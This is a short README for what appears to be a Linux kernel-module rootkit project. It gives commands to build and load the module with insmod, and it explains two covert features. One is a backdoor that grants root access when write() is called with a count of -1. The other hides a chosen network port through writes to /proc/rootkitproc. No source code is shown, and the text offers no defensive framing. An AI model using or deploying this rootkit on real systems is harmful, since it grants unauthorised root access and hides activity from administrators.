# lkm-rootkit
A rootkit implemented as a linux kernel module

##Syscall table:
###NOTICE:
This kernel module is only compatible with 64-bit PCs.
Please do NOT run if your PC is a 32-bit.



To load the 'rootkit' module:
--------------------------------
    make -f Makefile
    sudo insmod rootkit.ko
    dmesg | tail



To remove the module:
---------------------
    sudo rmmod rootkit

To be able to get root access:
------------------------------
	After loading the module, Invoke the write function with the last
	parameter (the count) passed as -1

To be able to hide a port:
------------------------------
	After loading the module, Isssue the following command
	echo "hp PORT_NUMBER" > /proc/rootkitproc

-----------------------------------------------------------------------------
